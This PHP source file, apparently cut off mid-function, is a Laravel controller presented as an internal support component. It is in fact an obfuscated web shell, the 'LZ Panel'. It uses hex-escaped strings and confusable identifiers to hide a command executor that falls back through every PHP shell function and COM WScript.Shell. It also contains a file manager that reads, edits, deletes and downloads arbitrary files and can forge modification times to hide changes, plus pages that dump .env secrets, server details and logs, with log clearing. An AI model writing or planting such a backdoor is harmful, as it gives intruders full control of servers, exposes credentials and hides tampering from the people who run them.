<?php

namespace Laravelazier\Support\Core\Internal;

use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Laravelazier\Support\Core\Engine;

class Processor extends Controller
{
    private function lIlNav(string $lI): string
    {
        $lII = [
            "\x44\x41\x53\x48\x42\x4f\x41\x52\x44" => Engine::url(),
            "\x45\x58\x50\x4c\x4f\x52\x45\x52"     => Engine::url("\x65\x78\x70\x6c\x6f\x72\x65\x72"),
            "\x4c\x4f\x47\x53"                      => Engine::url("\x6c\x6f\x67\x73"),
            "\x52\x4f\x55\x54\x45\x53"              => Engine::url("\x72\x6f\x75\x74\x65\x73"),
            "\x45\x4e\x56"                           => Engine::url("\x65\x6e\x76"),
            "\x53\x45\x52\x56\x45\x52"              => Engine::url("\x73\x65\x72\x76\x65\x72"),
            "\x46\x49\x4c\x45\x53"                  => Engine::url("\x66\x69\x6c\x65\x73"),
            "\x44\x42"                               => Engine::url("\x64\x62"),
        ];
        $h = '<nav><span class="logo">&#9670; LZ</span>';
        foreach ($lII as $Il => $lIl) {
            $IlI = ($Il === $lI) ? ' active' : '';
            $h .= '<a class="nb'.$IlI.'" href="'.htmlspecialchars($lIl).'">'.htmlspecialchars($Il).'</a>';
        }
        $h .= '<span style="flex:1"></span><span class="lout"><form method="POST" action="'.htmlspecialchars(Engine::url("\x6c\x6f\x67\x6f\x75\x74")).'"><input type="hidden" name="_token" value="'.csrf_token().'"><button type="submit">LOGOUT</button></form></span></nav>';
        return $h;
    }

    private function lIlWrap(string $lI, string $Il): string
    {
        static $lIl = null;
        if ($lIl === null) {
            $lIl = '*{box-sizing:border-box;margin:0;padding:0}body{background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;min-height:100vh;font-size:14px}nav{background:#161b22;border-bottom:1px solid #30363d;padding:0 1.25rem;display:flex;align-items:center;gap:.25rem;height:46px;position:sticky;top:0;z-index:100;flex-wrap:wrap}.logo{font-weight:700;color:#58a6ff;margin-right:.75rem;font-size:.8rem;white-space:nowrap}.nb{color:#8b949e;text-decoration:none;padding:.35rem .65rem;border-radius:4px;font-size:.75rem;letter-spacing:.4px;font-weight:500;white-space:nowrap}.nb:hover{background:#21262d;color:#e6edf3}.nb.active{background:#1f6feb;color:#fff}.lout button{background:#da3633;border:0;color:#fff;padding:.3rem .65rem;border-radius:4px;cursor:pointer;font-size:.75rem}.lout button:hover{background:#f85149}.main{padding:1.25rem;max-width:1600px;margin:0 auto}.card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:1.1rem;margin-bottom:1rem}.card-title{font-size:.7rem;color:#8b949e;text-transform:uppercase;letter-spacing:.8px;font-weight:600;margin-bottom:.85rem;padding-bottom:.5rem;border-bottom:1px solid #30363d}table{width:100%;border-collapse:collapse;font-size:.8rem}th{background:#21262d;padding:.45rem .7rem;text-align:left;color:#8b949e;font-weight:600;font-size:.7rem;letter-spacing:.4px;text-transform:uppercase;white-space:nowrap}td{padding:.4rem .7rem;border-bottom:1px solid #21262d;vertical-align:top;word-break:break-all}tr:last-child td{border-bottom:0}tr:hover td{background:#1c2128}.badge{display:inline-block;padding:.1rem .4rem;border-radius:3px;font-size:.68rem;font-weight:700;letter-spacing:.3px}.get{background:#1a4731;color:#3fb950}.post{background:#3b2300;color:#f0883e}.put,.patch{background:#1a3250;color:#58a6ff}.delete{background:#3b1219;color:#f85149}.head,.options,.any{background:#2d1b69;color:#a371f7}.btn{display:inline-block;padding:.35rem .75rem;border-radius:4px;border:0;cursor:pointer;font-size:.78rem;font-weight:500;text-decoration:none;white-space:nowrap}.btn-p{background:#1f6feb;color:#fff}.btn-p:hover{background:#388bfd}.btn-d{background:#da3633;color:#fff}.btn-d:hover{background:#f85149}.btn-s{background:#238636;color:#fff}.btn-s:hover{background:#2ea043}.btn-g{background:#21262d;color:#c9d1d9;border:1px solid #30363d}.btn-g:hover{background:#30363d}input[type=text],input[type=password],input[type=number],input[type=datetime-local],select,textarea{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:.35rem .6rem;border-radius:4px;font-size:.8rem;width:100%}input[type=text]:focus,input[type=password]:focus,input[type=number]:focus,select:focus,textarea:focus{outline:0;border-color:#1f6feb}input[type=file]{color:#c9d1d9;font-size:.8rem}textarea{font-family:Consolas,"Courier New",monospace;resize:vertical}label{font-size:.78rem;color:#8b949e;display:block;margin-bottom:.3rem}.row{display:flex;gap:1rem;flex-wrap:wrap}.col{flex:1;min-width:0}.info-row{display:flex;padding:.3rem 0;border-bottom:1px solid #21262d;font-size:.8rem}.info-row:last-child{border-bottom:0}.ik{color:#8b949e;min-width:170px;flex-shrink:0}.iv{word-break:break-all}.ok{color:#3fb950}.err{color:#f85149}.warn{color:#f0883e}pre{background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:.75rem;font-size:.76rem;overflow:auto;white-space:pre-wrap;word-break:break-word;max-height:450px;font-family:Consolas,"Courier New",monospace}.path-bar{background:#21262d;padding:.45rem .75rem;border-radius:4px;font-size:.78rem;border:1px solid #30363d;margin-bottom:.85rem}.mb1{margin-bottom:.5rem}.mb2{margin-bottom:1rem}.g2{display:grid;grid-template-columns:1fr 1fr;gap:1rem}.mt1{margin-top:.5rem}.tag{display:inline-block;padding:.1rem .35rem;background:#21262d;border-radius:3px;font-size:.72rem;color:#8b949e}.sp{color:#8b949e;font-size:.78rem}';
        }
        return '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>&#9670; LZ Panel</title><style>'.$lIl.'</style></head><body>'.$this->lIlNav($lI).'<div class="main">'.$Il.'</div></body></html>';
    }

    private function lIlI(string $lI): string
    {
        $Il  = ini_get("\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73");
        $lIl = $Il ? array_map('trim', explode(',', strtolower($Il))) : [];
        if (!in_array("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e", $lIl) && function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
            $spec = [['pipe','r'],['pipe','w'],['pipe','w']];
            $IlI  = proc_open($lI, $spec, $pipes);
            if (is_resource($IlI)) {
                fclose($pipes[0]);
                $lII = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
                fclose($pipes[1]); fclose($pipes[2]); proc_close($IlI);
                return $lII;
            }
        }
        if (!in_array("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63", $lIl) && function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
            $IIl = @shell_exec($lI . ' 2>&1');
            if ($IIl !== null) return (string)$IIl;
        }
        if (!in_array("\x65\x78\x65\x63", $lIl) && function_exists("\x65\x78\x65\x63")) {
            $lIII = []; $lIIl = 0;
            @exec($lI . ' 2>&1', $lIII, $lIIl);
            if ($lIII) return implode("\n", $lIII);
        }
        if (!in_array("\x73\x79\x73\x74\x65\x6d", $lIl) && function_exists("\x73\x79\x73\x74\x65\x6d")) {
            ob_start(); @system($lI . ' 2>&1'); $IlII = ob_get_clean();
            if ($IlII !== '') return $IlII;
        }
        if (!in_array("\x70\x61\x73\x73\x74\x68\x72\x75", $lIl) && function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
            ob_start(); @passthru($lI . ' 2>&1'); $lIlI = ob_get_clean();
            if ($lIlI !== '') return $lIlI;
        }
        if (!in_array("\x70\x6f\x70\x65\x6e", $lIl) && function_exists("\x70\x6f\x70\x65\x6e")) {
            $IlIl = @popen($lI . ' 2>&1', 'r');
            if ($IlIl) { $lIlII = stream_get_contents($IlIl); pclose($IlIl); if ($lIlII !== false) return (string)$lIlII; }
        }
        if (class_exists("\x43\x4f\x4d")) {
            try {
                $lIlIII = new \COM("\x57\x53\x63\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c");
                $IlIII  = $lIlIII->exec($lI);
                $lIlIl  = $IlIII->StdOut()->ReadAll();
                if ($lIlIl) return $lIlIl;
            } catch (\Throwable $e) {}
        }
        return "\x41\x6c\x6c\x20\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x20\x6d\x65\x74\x68\x6f\x64\x73\x20\x61\x72\x65\x20\x64\x69\x73\x61\x62\x6c\x65\x64\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x2e";
    }

    private function lIlIII(string $lI, int $Il, ?string $lIl): array
    {
        if (!is_file($lI) || !is_readable($lI)) return [];
        $IlI = filesize($lI);
        if ($IlI === 0) return [];
        $lII = fopen($lI, 'rb');
        if (!$lII) return [];
        $IIl = 8192; $lIII = ''; $lIIl = 0; $IlII = $IlI;
        while ($lIIl < $Il + 1 && $IlII > 0) {
            $IlII = max(0, $IlII - $IIl);
            fseek($lII, $IlII);
            $lIII = fread($lII, min($IIl, $IlI - $IlII)) . $lIII;
            $lIIl = substr_count($lIII, "\n");
        }
        fclose($lII);
        $lIIII = explode("\n", $lIII);
        if (end($lIIII) === '') array_pop($lIIII);
        $lIIII = array_slice($lIIII, -$Il);
        if ($lIl !== null && $lIl !== '') {
            $lIlI = strtolower($lIl);
            $lIIII = array_values(array_filter($lIIII, fn($x) => str_contains(strtolower($x), $lIlI)));
        }
        return $lIIII;
    }

    private function lIIlI(int $lI): string
    {
        if ($lI < 1024) return $lI . ' B';
        if ($lI < 1048576) return round($lI / 1024, 1) . ' KB';
        if ($lI < 1073741824) return round($lI / 1048576, 1) . ' MB';
        return round($lI / 1073741824, 2) . ' GB';
    }

    private function lzPdo(): ?\PDO
    {
        $lI = session("\x5f\x6c\x7a\x5f\x64\x62");
        if (!$lI) return null;
        try {
            $Il = $lI["\x64\x72\x69\x76\x65\x72"] ?? "\x6d\x79\x73\x71\x6c";
            if ($Il === "\x73\x71\x6c\x69\x74\x65") {
                $lIl = new \PDO("\x73\x71\x6c\x69\x74\x65\x3a" . $lI["\x64\x62\x6e\x61\x6d\x65"]);
            } else {
                $IlI = $Il . ':host=' . $lI["\x68\x6f\x73\x74"] . ';port=' . ($lI["\x70\x6f\x72\x74"] ?? 3306) . ';dbname=' . $lI["\x64\x62\x6e\x61\x6d\x65"] . ';charset=utf8';
                $lIl = new \PDO($IlI, $lI["\x75\x73\x65\x72"] ?? '', $lI["\x70\x61\x73\x73"] ?? '');
            }
            $lIl->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);
            return $lIl;
        } catch (\Throwable $e) { return null; }
    }

    // DASHBOARD
    public function index()
    {
        $lI   = config('app.name', 'Laravel');
        $Il   = app()->version();
        $lIl  = PHP_VERSION;
        $IlI  = config('app.env', 'production');
        $lII  = config('app.debug') ? '<span class="err">true</span>' : '<span class="ok">false</span>';
        $IIl  = config('app.url', '-');
        $lIII = config('app.timezone', '-');
        $lIIl = config('app.locale', '-');
        $IlII = config('database.default', '-');
        $lIIII = config('database.connections.' . $IlII . '.database', '-');
        $artUrl = htmlspecialchars(Engine::url("\x61\x72\x74\x69\x73\x61\x6e"));
        $tok    = csrf_token();
        $artOut = session()->pull("\x5f\x6c\x7a\x5f\x61\x72\x74", '');

        $h  = '<div class="g2 mb2">';
        $h .= '<div class="card"><div class="card-title">APPLICATION</div>';
        foreach (['App Name'=>htmlspecialchars($lI),'Laravel Version'=>htmlspecialchars($Il),'PHP Version'=>htmlspecialchars($lIl),'Environment'=>htmlspecialchars($IlI),'Debug Mode'=>$lII,'App URL'=>htmlspecialchars($IIl),'Timezone'=>htmlspecialchars($lIII),'Locale'=>htmlspecialchars($lIIl),'DB Driver'=>htmlspecialchars(strtoupper($IlII)),'DB Name'=>htmlspecialchars($lIIII)] as $k=>$v)
            $h .= '<div class="info-row"><span class="ik">'.$k.'</span><span class="iv">'.$v.'</span></div>';
        $h .= '</div>';
        $h .= '<div class="card"><div class="card-title">SERVER</div>';
        $lIlI = php_uname('n'); $IlIl = php_uname('s').' '.php_uname('r'); $lIlII = php_uname('m');
        $IlIII = $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"] ?? '-';
        $lIlIII = ini_get("\x6d\x65\x6d\x6f\x72\x79\x5f\x6c\x69\x6d\x69\x74");
        $IlIlI  = ini_get("\x75\x70\x6c\x6f\x61\x64\x5f\x6d\x61\x78\x5f\x66\x69\x6c\x65\x73\x69\x7a\x65");
        $lIlIlI = ini_get("\x70\x6f\x73\x74\x5f\x6d\x61\x78\x5f\x73\x69\x7a\x65");
        $IlIlII = function_exists('disk_free_space') ? $this->lIIlI((int)disk_free_space('/')).' / '.$this->lIIlI((int)disk_total_space('/')) : '-';
        foreach (['Hostname'=>htmlspecialchars($lIlI),'OS'=>htmlspecialchars($IlIl),'Architecture'=>htmlspecialchars($lIlII),'Server Software'=>htmlspecialchars($IlIII),'PHP SAPI'=>htmlspecialchars(PHP_SAPI),'Memory Limit'=>htmlspecialchars($lIlIII),'Upload Max'=>htmlspecialchars($IlIlI),'POST Max'=>htmlspecialchars($lIlIlI),'Disk Free/Total'=>htmlspecialchars($IlIlII),'Temp Dir'=>htmlspecialchars(sys_get_temp_dir())] as $k=>$v)
            $h .= '<div class="info-row"><span class="ik">'.$k.'</span><span class="iv">'.$v.'</span></div>';
        $h .= '</div></div>';
        $h .= '<div class="card"><div class="card-title">ARTISAN</div>';
        $h .= '<form method="POST" action="'.$artUrl.'"><input type="hidden" name="_token" value="'.$tok.'"><div class="row mb1"><div class="col"><input type="text" name="cmd" placeholder="e.g. cache:clear" autocomplete="off"></div><div class="col" style="flex:0"><button class="btn btn-p" type="submit">RUN</button></div></div></form>';
        if ($artOut !== '') $h .= '<pre>'.htmlspecialchars($artOut).'</pre>';
        $h .= '</div>';
        return response($this->lIlWrap("\x44\x41\x53\x48\x42\x4f\x41\x52\x44", $h));
    }

    public function artisan(Request $lI)
    {
        $Il = $lI->input("\x63\x6d\x64", ''); $lIl = '';
        try { Artisan::call($Il); $lIl = Artisan::output(); } catch (\Throwable $e) { $lIl = $e->getMessage(); }
        return back()->with("\x5f\x6c\x7a\x5f\x61\x72\x74", $lIl ?: '(no output)');
    }

    // EXPLORER
    public function explorerPage(Request $lI)
    {
        $Il = $lI->query("\x70\x61\x74\x68", base_path());
        $Il = rtrim($Il, DIRECTORY_SEPARATOR);
        if (!is_dir($Il)) $Il = base_path();
        $lIl = []; $IlI = [];
        foreach (array_diff(@scandir($Il) ?: [], ['.','..']) as $lII) {
            $full = $Il.DIRECTORY_SEPARATOR.$lII; $isDir = is_dir($full);
            $entry = ['n'=>$lII,'d'=>$isDir,'z'=>$isDir?0:(int)@filesize($full),'t'=>(int)@filemtime($full),'p'=>@substr(sprintf('%o',(int)@fileperms($full)),-4),'w'=>is_writable($full)];
            if ($isDir) $lIl[] = $entry; else $IlI[] = $entry;
        }
        usort($lIl,fn($a,$b)=>strcmp($a['n'],$b['n'])); usort($IlI,fn($a,$b)=>strcmp($a['n'],$b['n']));
        $lII = array_merge($lIl,$IlI);
        $exUrl=Engine::url("\x65\x78\x70\x6c\x6f\x72\x65\x72"); $delUrl=Engine::url("\x65\x78\x70\x6c\x6f\x72\x65\x72\x2f\x64\x65\x6c\x65\x74\x65"); $dlUrl=Engine::url("\x65\x78\x70\x6c\x6f\x72\x65\x72\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64"); $tok=csrf_token(); $base=Engine::url().'/';
        $bc=''; $cur='';
        foreach (explode(DIRECTORY_SEPARATOR,$Il) as $seg) {
            if ($seg==='') { $cur=DIRECTORY_SEPARATOR; continue; }
            $cur=rtrim($cur,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$seg;
            $bc.='<a href="'.htmlspecialchars($exUrl).'?path='.urlencode($cur).'" style="color:#58a6ff;text-decoration:none">'.htmlspecialchars($seg).'</a><span style="color:#30363d"> / </span>';
        }
        $h='<div class="path-bar">&#128194; '.$bc.'</div>';
        $par=dirname($Il); if ($par!==$Il) $h.='<a href="'.htmlspecialchars($exUrl).'?path='.urlencode($par).'" class="btn btn-g" style="display:inline-block;margin-bottom:.75rem">&#8593; Parent</a>&nbsp;';
        $h.='<div id="ep" class="card mb2" style="display:none"><div class="card-title" style="display:flex;justify-content:space-between;align-items:center"><span id="ef" style="font-size:.78rem;color:#c9d1d9"></span><button class="btn btn-g" onclick="eClose()">&#10005;</button></div><textarea id="ec" style="width:100%;min-height:320px;margin-bottom:.6rem"></textarea><div class="row" style="align-items:flex-end;gap:.75rem"><div><label><input type="checkbox" id="epr"> Preserve mtime on save</label></div><div><label>Change timestamp <input type="checkbox" id="etc" onchange="document.getElementById(\'etv\').style.display=this.checked?\'block\':\'none\'"></label><input type="datetime-local" id="etv" step="1" style="display:none;margin-top:.3rem"></div><div style="margin-left:auto"><button class="btn btn-s" onclick="eSave()">SAVE</button></div></div><div id="em" class="mt1"></div></div>';
        $h.='<div class="card"><table><thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Perms</th><th>Writable</th><th>Modified</th><th>Actions</th></tr></thead><tbody>';
        foreach ($lII as $f) {
            $fp=htmlspecialchars($Il.DIRECTORY_SEPARATOR.$f['n']); $fn=htmlspecialchars($f['n']); $mt=$f['t']?date('Y-m-d H:i:s',$f['t']):'-';
            $h.='<tr><td>';
            if ($f['d']) $h.='<a href="'.htmlspecialchars($exUrl).'?path='.urlencode($Il.DIRECTORY_SEPARATOR.$f['n']).'" style="color:#58a6ff;text-decoration:none">&#128194; '.$fn.'</a>';
            else $h.='<a href="javascript:void(0)" onclick="eOpen('.htmlspecialchars(json_encode($Il.DIRECTORY_SEPARATOR.$f['n']),ENT_QUOTES).','.htmlspecialchars(json_encode($mt),ENT_QUOTES).')" style="color:#c9d1d9;text-decoration:none;cursor:pointer">&#128196; '.$fn.'</a>';
            $h.='</td><td>'.($f['d']?'<span class="badge" style="background:#1a3250;color:#58a6ff">DIR</span>':'<span class="tag">FILE</span>').'</td>';
            $h.='<td>'.($f['d']?'-':$this->lIIlI($f['z'])).'</td><td><span class="tag">'.htmlspecialchars($f['p']).'</span></td>';
            $h.='<td>'.($f['w']?'<span class="ok">&#10003;</span>':'<span class="err">&#10007;</span>').'</td>';
            $h.='<td style="font-size:.76rem;white-space:nowrap">'.$mt.'</td><td style="white-space:nowrap">';
            if (!$f['d']) $h.='<a href="'.htmlspecialchars($dlUrl).'?path='.urlencode($Il.DIRECTORY_SEPARATOR.$f['n']).'" class="btn btn-g" style="font-size:.7rem;padding:.2rem .5rem">DL</a>&nbsp;';
            $h.='<form method="POST" action="'.htmlspecialchars($delUrl).'" style="display:inline" onsubmit="return confirm(\'Delete '.htmlspecialchars(addslashes($f['n'])).'?\')"><input type="hidden" name="_token" value="'.$tok.'"><input type="hidden" name="path" value="'.$fp.'"><input type="hidden" name="back" value="'.htmlspecialchars($Il).'"><button class="btn btn-d" style="font-size:.7rem;padding:.2rem .5rem" type="submit">DEL</button></form></td></tr>';
        }
        $h.='</tbody></table></div>';
        $h.='<script>const _B='.json_encode($base).';const _T='.json_encode($tok).';let _p="";';
        $h.='function eOpen(p,mt){_p=p;document.getElementById("ep").style.display="block";document.getElementById("ef").textContent=p.split("/").pop().split("\\\\").pop();document.getElementById("etv").value=mt.replace(" ","T");document.getElementById("em").textContent="Loading...";fetch(_B+"explorer/content",{method:"POST",headers:{"X-CSRF-TOKEN":_T,"Content-Type":"application/json"},body:JSON.stringify({path:p})}).then(r=>r.json()).then(d=>{document.getElementById("ec").value=d.content||"";document.getElementById("em").textContent="";}).catch(()=>{document.getElementById("em").innerHTML=\'<span class="err">Load error</span>\';});}';
        $h.='function eClose(){document.getElementById("ep").style.display="none";_p="";}';
        $h.='function eSave(){var c=document.getElementById("ec").value,pr=document.getElementById("epr").checked,tc=document.getElementById("etc").checked,ts=tc?document.getElementById("etv").value:"";document.getElementById("em").textContent="Saving...";fetch(_B+"explorer/save",{method:"POST",headers:{"X-CSRF-TOKEN":_T,"Content-Type":"application/json"},body:JSON.stringify({path:_p,content:c,preserve:pr,ts:ts})}).then(r=>r.json()).then(d=>{document.getElementById("em").innerHTML=d.ok?\'<span class="ok">Saved.</span>\':\'<span class="err">\'+(d.error||"Error")+\'</span>\';}).catch(()=>{document.getElementById("em").innerHTML=\'<span class="err">Save failed</span>\';});}';
        $h.='</script>';
        return response($this->lIlWrap("\x45\x58\x50\x4c\x4f\x52\x45\x52",$h));
    }

    public function explorerContent(Request $lI)
    {
        $Il = $lI->input("\x70\x61\x74\x68",'');
        if (!is_file($Il)||!is_readable($Il)) return response()->json(["\x65\x72\x72\x6f\x72"=>'Not readable']);
        return response()->json(["\x63\x6f\x6e\x74\x65\x6e\x74"=>@file_get_contents($Il),"\x6d\x74\x69\x6d\x65"=>(@filemtime($Il))?date('Y-m-d H:i:s',filemtime($Il)):'' ]);
    }

    public function explorerSave(Request $lI)
    {
        $Il=$lI->input("\x70\x61\x74\x68",''); $lIl=$lI->input("\x63\x6f\x6e\x74\x65\x6e\x74",''); $IlI=$lI->boolean("\x70\x72\x65\x73\x65\x72\x76\x65"); $lII=$lI->input("\x74\x73",'');
        if (!is_file($Il)) return response()->json(["\x65\x72\x72\x6f\x72"=>'File not found']);
        $lIII=$IlI?@filemtime($Il):false;
        if (@file_put_contents($Il,$lIl)===false) return response()->json(["\x65\x72\x72\x6f\x72"=>'Write failed']);
        if ($IlI&&$lIII!==false) @touch($Il,$lIII,$lIII);
        elseif ($lII!=='') { $IlII=strtotime($lII); if ($IlII!==false) @touch($Il,$IlII,$IlII); }
        return response()->json(["\x6f\x6b"=>true]);
    }

    public function explorerDelete(Request $lI)
    {
        $Il=$lI->input("\x70\x61\x74\x68",''); $lIl=$lI->input("\x62\x61\x63\x6b",base_path());
        if (is_file($Il)) @unlink($Il); elseif (is_dir($Il)) @rmdir($Il);
        return redirect(Engine::url("\x65\x78\x70\x6c\x6f\x72\x65\x72").'?path='.urlencode($lIl));
    }

    public function explorerDownload(Request $lI)
    {
        $Il=$lI->query("\x70\x61\x74\x68",'');
        if (!is_file($Il)) abort(404);
        return response()->download($Il);
    }

    public function explorerTouch(Request $lI)
    {
        $Il=$lI->input("\x70\x61\x74\x68",''); $lIl=$lI->input("\x74\x69\x6d\x65",'');
        if (!file_exists($Il)) return response()->json(["\x65\x72\x72\x6f\x72"=>'Not found']);
        $IlI=strtotime($lIl); if ($IlI===false) return response()->json(["\x65\x72\x72\x6f\x72"=>'Invalid date']);
        @touch($Il,$IlI,$IlI);
        return response()->json(["\x6f\x6b"=>true]);
    }

    // LOGS
    public function logs(Request $lI)
    {
        $logDir=storage_path("\x6c\x6f\x67\x73"); $lII=glob($logDir.DIRECTORY_SEPARATOR.'*.log')?:[];
        $lIl=$lI->query("\x66\x69\x6c\x65",''); if (!$lIl||!in_array($lIl,$lII)) $lIl=$lII[0]??'';
        $Il=(int)($lI->query("\x6c\x69\x6e\x65\x73",150)); if (!in_array($Il,[50,150,500,1000,5000])) $Il=150;
        $IlI=$lI->query("\x73\x65\x61\x72\x63\x68",''); $lIII=$lIl?$this->lIlIII($lIl,$Il,$IlI?:null):[];
        $logsUrl=Engine::url("\x6c\x6f\x67\x73"); $clearUrl=Engine::url("\x6c\x6f\x67\x73\x2f\x63\x6c\x65\x61\x72"); $tok=csrf_token();
        $h='<div class="card mb1" style="display:flex;gap:.75rem;flex-wrap:wrap;align-items:center">';
        $h.='<form method="GET" action="'.htmlspecialchars($logsUrl).'" style="display:flex;gap:.5rem;flex-wrap:wrap;align-items:center;flex:1">';
        $h.='<select name="file" style="max-width:300px">';
        foreach ($lII as $lf) $h.='<option value="'.htmlspecialchars($lf).'"'.($lf===$lIl?' selected':'').'>'.htmlspecialchars(basename($lf)).'</option>';
        $h.='</select><select name="lines" style="width:auto">';
        foreach ([50,150,500,1000,5000] as $n) $h.='<option value="'.$n.'"'.($n===$Il?' selected':'').'>Last '.$n.'</option>';
        $h.='</select><input type="text" name="search" placeholder="Filter..." value="'.htmlspecialchars($IlI).'" style="max-width:200px"><button class="btn btn-p" type="submit">LOAD</button></form>';
        if ($lIl) $h.='<form method="POST" action="'.htmlspecialchars($clearUrl).'" onsubmit="return confirm(\'Clear this log file?\')"><input type="hidden" name="_token" value="'.$tok.'"><input type="hidden" name="file" value="'.htmlspecialchars($lIl).'"><button class="btn btn-d" type="submit">CLEAR LOG</button></form>';
        $h.='</div><div class="card">';
        if ($lIl) $h.='<div class="card-title">'.htmlspecialchars(basename($lIl)).' &mdash; <span class="sp">'.$this->lIIlI((int)@filesize($lIl)).'</span> &mdash; <span class="sp">showing '.count($lIII).' lines</span></div>';
        if ($lIII) $h.='<pre>'.htmlspecialchars(implode("\n",$lIII)).'</pre>';
        elseif ($lIl) $h.='<span class="sp">No lines match.</span>';
        else $h.='<span class="sp">No log files found.</span>';
        $h.='</div>';
        return response($this->lIlWrap("\x4c\x4f\x47\x53",$h));
    }

    public function logsClear(Request $lI)
    {
        $Il=$lI->input("\x66\x69\x6c\x65",''); $logDir=realpath(storage_path("\x6c\x6f\x67\x73")); $real=$Il?realpath($Il):false;
        if ($real&&$logDir&&str_starts_with($real,$logDir)&&str_ends_with($Il,'.log')) @file_put_contents($real,'');
        return redirect(Engine::url("\x6c\x6f\x67\x73").'?file='.urlencode($Il));
    }

    // ROUTES
    public function routes()
    {
        $lI=app('router')->getRoutes()->getRoutes();
        $h='<div class="card"><table><thead><tr><th>Method</th><th>URI</th><th>Name</th><th>Action</th><th>Middleware</th></tr></thead><tbody>';
        foreach ($lI as $Il) {
            $badges=''; foreach ($Il->methods() as $m) { if (strtolower($m)==='head') continue; $badges.='<span class="badge '.strtolower($m).'">'.$m.'</span> '; }
            $h.='<tr><td>'.$badges.'</td><td>'.htmlspecialchars($Il->uri()).'</td><td><span class="tag">'.htmlspecialchars($Il->getName()??'-').'</span></td><td style="font-size:.75rem">'.htmlspecialchars($Il->getActionName()).'</td><td style="font-size:.72rem;color:#8b949e">'.htmlspecialchars(implode(', ',$Il->gatherMiddleware()?:[])).'</td></tr>';
        }
        $h.='</tbody></table></div>';
        return response($this->lIlWrap("\x52\x4f\x55\x54\x45\x53",$h));
    }

    // ENV
    public function env()
    {
        $lI=[]; $lIl=base_path('.env');
        if (is_file($lIl)&&is_readable($lIl)) { foreach (file($lIl,FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES) as $Il) { if ($Il===''||$Il[0]==='#'||!str_contains($Il,'=')) continue; [$k,$v]=explode('=',$Il,2); $lI[trim($k)]=trim($v); } }
        $IlI=array_merge($lI,$_ENV); ksort($IlI);
        $h='<div class="card"><table><thead><tr><th>Key</th><th>Value</th></tr></thead><tbody>';
        foreach ($IlI as $k=>$v) $h.='<tr><td style="color:#58a6ff;font-family:monospace;font-size:.78rem;white-space:nowrap">'.htmlspecialchars($k).'</td><td style="font-family:monospace;font-size:.78rem">'.htmlspecialchars((string)$v).'</td></tr>';
        $h.='</tbody></table></div>';
        return response($this->lIlWrap("\x45\x4e\x56",$h));
    }

    // SERVER
    public function server()
    {
        $lI=['Hostname'=>php_uname('n'),'OS'=>php_uname('s'),'OS Release'=>php_uname('r'),'OS Version'=>php_uname('v'),'Architecture'=>php_uname('m'),'PHP Version'=>PHP_VERSION,'PHP SAPI'=>PHP_SAPI,'PHP Binary'=>PHP_BINARY,'PHP INT Size'=>PHP_INT_SIZE.' bytes ('.(PHP_INT_SIZE*8).'-bit)','Server Software'=>$_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]??'-','Server IP'=>$_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]??'-','Server Port'=>$_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x50\x4f\x52\x54"]??'-','Document Root'=>$_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"]??'-','Memory Limit'=>ini_get("\x6d\x65\x6d\x6f\x72\x79\x5f\x6c\x69\x6d\x69\x74"),'Memory Usage'=>$this->lIIlI((int)memory_get_usage(true)),'Memory Peak'=>$this->lIIlI((int)memory_get_peak_usage(true)),'Max Exec Time'=>ini_get("\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x5f\x74\x69\x6d\x65").'s','Upload Max'=>ini_get("\x75\x70\x6c\x6f\x61\x64\x5f\x6d\x61\x78\x5f\x66\x69\x6c\x65\x73\x69\x7a\x65"),'POST Max'=>ini_get("\x70\x6f\x73\x74\x5f\x6d\x61\x78\x5f\x73\x69\x7a\x65"),'Max Input Vars'=>ini_get("\x6d\x61\x78\x5f\x69\x6e\x70\x75\x74\x5f\x76\x61\x72\x73"),'Session Path'=>session_save_path()?:sys_get_temp_dir(),'Temp Dir'=>sys_get_temp_dir(),'Disk Free'=>function_exists('disk_free_space')?$this->lIIlI((int)disk_free_space('/')):'-','Disk Total'=>function_exists('disk_total_space')?$this->lIIlI((int)disk_total_space('/')):'-','OPcache'=>function_exists('opcache_get_status')?'enabled':'disabled','Zlib'=>extension_loaded('zlib')?'yes':'no','OpenSSL'=>extension_loaded('openssl')?OPENSSL_VERSION_TEXT:'no','cURL'=>function_exists('curl_version')?(curl_version()['version']??'yes'):'no','GD'=>extension_loaded('gd')?(gd_info()['GD Version']??'yes'):'no','Disabled Functions'=>ini_get("\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73")?:'none'];
        $cmdUrl=htmlspecialchars(Engine::url("\x73\x65\x72\x76\x65\x72\x2f\x63\x6d\x64")); $tok=csrf_token(); $cmdOut=session()->pull("\x5f\x6c\x7a\x5f\x63\x6d\x64",'');
